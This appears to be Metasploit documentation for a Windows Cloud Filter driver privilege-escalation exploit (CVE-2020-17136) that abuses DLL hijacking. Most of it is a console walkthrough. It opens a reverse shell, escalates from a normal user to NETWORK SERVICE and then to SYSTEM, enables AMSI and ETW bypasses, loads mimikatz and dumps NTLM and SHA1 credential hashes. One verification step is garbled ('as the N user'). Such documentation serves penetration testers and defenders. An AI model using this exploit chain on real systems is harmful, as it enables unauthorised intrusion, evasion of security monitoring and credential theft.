## Vulnerable Application
The Cloud Filter driver, `cldflt.sys`, on Windows 10 v1803 and later, prior to the December 2020 updates,
did not set the `IO_FORCE_ACCESS_CHECK` and `OBJ_FORCE_ACCESS_CHECK` flags when calling
`FltCreateFileEx()` and `FltCreateFileEx2()` within its `HsmpOpCreatePlaceholders()` function with attacker
controlled input. This meant that files were created with `KernelMode` permissions, thereby bypassing any
security checks that would otherwise prevent a normal user from being able to create files in directories
they don't have permissions to create files in.

This module abuses this vulnerability to perform a DLL hijacking attack against the Microsoft Storage
Spaces SMP service, which grants the attacker code execution as the `NETWORK SERVICE` user. Users are
strongly encouraged to set the `PAYLOAD` option to one of the Meterpreter payloads, as doing so will
allow them to subsequently escalate their new session from `NETWORK SERVICE` to `SYSTEM` by using
Meterpreter's `getsystem` command to perform RPCSS Named Pipe Impersonation and impersonate
the `SYSTEM` user.

### Installation And Setup
`cldflt.sys` should exist by default on all versions of Windows 10 v1803 and later.

## Verification Steps
  1. Start msfconsole
  2. Get a shell as a low privileged user.
  3. **Verify** that `getsystem` does not get you a `SYSTEM` shell.
  4. `use exploit/windows/local/cve_2020_17136`
  5. `set session *session id*`
  6. `run`
  7. **Verify** that you get a new shell as the `N` user

## Options

### AMSIBYPASS
Enable or disable ASMI bypass.

### ETWBYPASS
Enable or disable ETW bypass.

### WAIT
Time in seconds to wait before starting to read the text output from the injected C# exe.

## Scenarios

### Windows 10 2004 x64 - Build 19041.630 with cldflt.sys version 10.0.19041.488

```
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 172.22.152.177:4444
[*] Sending stage (200262 bytes) to 172.22.152.177
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 172.22.152.177:4444) at 2021-01-08 11:17:11 -0600

meterpreter > getuid
Server username: DESKTOP-KUO5CML\normal
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > getsystem
[-] 2001: Operation failed: Access is denied. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use exploit/windows/local/cve_2020_17136
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2020_17136) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/cve_2020_17136) > check
[*] The target appears to be vulnerable. A vulnerable Windows 10 20H1 build was detected!
msf6 exploit(windows/local/cve_2020_17136) > show options

Module options (exploit/windows/local/cve_2020_17136):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   AMSIBYPASS  true             yes       Enable Amsi bypass
   ETWBYPASS   true             yes       Enable Etw bypass
   SESSION     1                yes       The session to run this module on.
   WAIT        5                no        Time in seconds to wait


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows DLL Dropper


msf6 exploit(windows/local/cve_2020_17136) > set LHOST 172.22.159.28
LHOST => 172.22.159.28
msf6 exploit(windows/local/cve_2020_17136) > run

[*] Started reverse TCP handler on 172.22.159.28:4444
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable. A vulnerable Windows 10 20H1 build was detected!
[*] Dropping payload dll at C:\Windows\Temp\BXNkequQiAvYxuVp.dll and registering it for cleanup...
[*] Running module against DESKTOP-KUO5CML
[*] Launching notepad.exe to host CLR...
[+] Process 100 launched.
[*] Reflectively injecting the Host DLL into 100..
[*] Injecting Host into 100...
[*] Host injected. Copy assembly into 100...
[*] Assembly copied.
[*] Executing...
[*] Start reading output
[+] Sync connection key: 2733760425760
[+] Done
[*] End output.
[+] Execution finished.
[*] Sending stage (200262 bytes) to 172.22.152.177
[*] Meterpreter session 2 opened (172.22.159.28:4444 -> 172.22.152.177:49968) at 2021-01-08 11:18:19 -0600

meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > getsystem
...got system via technique 4 (Named Pipe Impersonation (RPCSS variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain           NTLM                              SHA1
--------  ------           ----                              ----
normal    DESKTOP-KUO5CML  a38673ad58b19421e952fc317b62c3c4  ccff8cc980f0024dc5b3f925194a35c0fa0231c3
test      DESKTOP-KUO5CML  0cb6948805f797bf2a82807973b89537  87f8ed9157125ffc4da9e06a7b8011ad80a53fe1

wdigest credentials
===================

Username          Domain           Password
--------          ------           --------
(null)            (null)           (null)
DESKTOP-KUO5CML$  WORKGROUP        (null)
normal            DESKTOP-KUO5CML  (null)
test              DESKTOP-KUO5CML  (null)

kerberos credentials
====================

Username          Domain           Password
--------          ------           --------
(null)            (null)           (null)
desktop-kuo5cml$  WORKGROUP        (null)
normal            DESKTOP-KUO5CML  (null)
test              DESKTOP-KUO5CML  (null)


meterpreter >
Background session 2? [y/N]
msf6 exploit(windows/local/cve_2020_17136) > sessions

Active sessions
===============

  Id  Name  Type                     Information                               Connection
  --  ----  ----                     -----------                               ----------
  1         meterpreter x64/windows  DESKTOP-KUO5CML\normal @ DESKTOP-KUO5CML  0.0.0.0:0 -> 172.22.152.177:4444 (172.22.152.177)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ DESKTOP-KUO5CML     172.22.159.28:4444 -> 172.22.152.177:49968 (172.22.152.177)

msf6 exploit(windows/local/cve_2020_17136) >
```
